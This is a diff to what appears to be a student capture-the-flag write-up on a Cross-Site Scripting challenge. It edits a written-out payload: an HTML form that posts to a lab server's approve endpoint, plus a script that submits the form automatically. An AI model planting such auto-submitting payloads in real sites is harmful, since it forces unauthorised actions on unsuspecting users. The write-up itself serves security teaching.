@@ -44,7 +44,7 @@ Given the nature of this challenge involving Cross-Site Scripting (XSS), we cond
 To implement this attack, we put our theoretical knowledge into practise. In our first try we start by using the following code as input on the homepage:
 
 ```html
-<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/fe40714890ff62433fce3e6a80b3c04aa52ea652/approve" target="_blank">      
+<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/fe40714890ff62433fce3e6a80b3c04aa52ea652/approve">      
 </form>
 
 <script> document.forms[0].submit() </script>
